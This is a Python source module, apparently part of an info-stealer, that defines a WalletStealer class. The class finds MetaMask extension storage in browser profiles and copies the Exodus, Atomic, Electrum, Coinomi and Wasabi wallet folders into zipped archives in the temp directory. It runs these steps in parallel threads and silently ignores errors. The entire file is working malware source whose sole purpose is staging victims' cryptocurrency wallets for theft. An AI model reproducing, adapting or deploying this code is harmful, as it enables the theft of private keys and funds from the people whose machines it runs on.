import os
import json
import shutil
import zipfile
import threading
from . import utils

class WalletStealer:
    def __init__(self):
        self.wallets = {}

    def steal_metamask(self, browser_path):
        extension_ids = [
            'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'ejbalbakoplchlghecdalmeeeajnimhm',
        ]
        profiles = ['Default']
        if os.path.exists(browser_path):
            try:
                for item in os.listdir(browser_path):
                    if item.startswith('Profile') and os.path.isdir(os.path.join(browser_path, item)):
                        profiles.append(item)
            except:
                pass
        found_path = None
        for profile in profiles:
            for ext_id in extension_ids:
                test_path = os.path.join(browser_path, profile, 'Local Extension Settings', ext_id)
                if os.path.exists(test_path):
                    found_path = test_path
                    break
                test_path = os.path.join(browser_path, 'Local Extension Settings', ext_id)
                if os.path.exists(test_path):
                    found_path = test_path
                    break
            if found_path:
                break
        if not found_path:
            return
        try:
            output_dir = os.path.join(utils.get_temp(), f'shiver_mm_{utils.generate_id()}')
            shutil.copytree(found_path, output_dir)
            zip_path = output_dir + '.zip'
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(output_dir):
                    for file in files:
                        zf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), output_dir))
            self.wallets['metamask'] = zip_path
        except:
            pass

    def steal_exodus(self):
        exodus_path = os.path.join(utils.get_appdata(), 'Exodus', 'exodus.wallet')
        if os.path.exists(exodus_path):
            try:
                output_dir = os.path.join(utils.get_temp(), f'shiver_exodus_{utils.generate_id()}')
                shutil.copytree(exodus_path, output_dir)
                zip_path = output_dir + '.zip'
                shutil.make_archive(output_dir, 'zip', output_dir)
                self.wallets['exodus'] = zip_path
            except:
                pass

    def steal_atomic(self):
        atomic_path = os.path.join(utils.get_appdata(), 'atomic')
        if os.path.exists(atomic_path):
            try:
                output_dir = os.path.join(utils.get_temp(), f'shiver_atomic_{utils.generate_id()}')
                shutil.copytree(atomic_path, output_dir)
                zip_path = output_dir + '.zip'
                shutil.make_archive(output_dir, 'zip', output_dir)
                self.wallets['atomic'] = zip_path
            except:
                pass

    def steal_electrum(self):
        electrum_path = os.path.join(utils.get_appdata(), 'Electrum', 'wallets')
        if os.path.exists(electrum_path):
            try:
                output_dir = os.path.join(utils.get_temp(), f'shiver_electrum_{utils.generate_id()}')
                shutil.copytree(electrum_path, output_dir)
                zip_path = output_dir + '.zip'
                shutil.make_archive(output_dir, 'zip', output_dir)
                self.wallets['electrum'] = zip_path
            except:
                pass

    def steal_coinomi(self):
        coinomi_path = os.path.join(utils.get_localappdata(), 'Coinomi', 'Coinomi', 'wallets')
        if os.path.exists(coinomi_path):
            try:
                output_dir = os.path.join(utils.get_temp(), f'shiver_coinomi_{utils.generate_id()}')
                shutil.copytree(coinomi_path, output_dir)
                zip_path = output_dir + '.zip'
                shutil.make_archive(output_dir, 'zip', output_dir)
                self.wallets['coinomi'] = zip_path
            except:
                pass

    def steal_wasabi(self):
        wasabi_path = os.path.join(utils.get_appdata(), 'WalletWasabi', 'Client')
        if os.path.exists(wasabi_path):
            try:
                output_dir = os.path.join(utils.get_temp(), f'shiver_wasabi_{utils.generate_id()}')
                shutil.copytree(wasabi_path, output_dir)
                zip_path = output_dir + '.zip'
                shutil.make_archive(output_dir, 'zip', output_dir)
                self.wallets['wasabi'] = zip_path
            except:
                pass

    def steal_all(self, browser_paths=None):
        threads = []
        if browser_paths:
            for path in browser_paths[:4]:
                t = threading.Thread(target=self.steal_metamask, args=(path,))
                threads.append(t)
                t.start()
        t = threading.Thread(target=self.steal_exodus)
        threads.append(t)
        t.start()
        t = threading.Thread(target=self.steal_atomic)
        threads.append(t)
        t.start()
        t = threading.Thread(target=self.steal_electrum)
        threads.append(t)
        t.start()
        t = threading.Thread(target=self.steal_coinomi)
        threads.append(t)
        t.start()
        t = threading.Thread(target=self.steal_wasabi)
        threads.append(t)
        t.start()
        for t in threads:
            t.join()
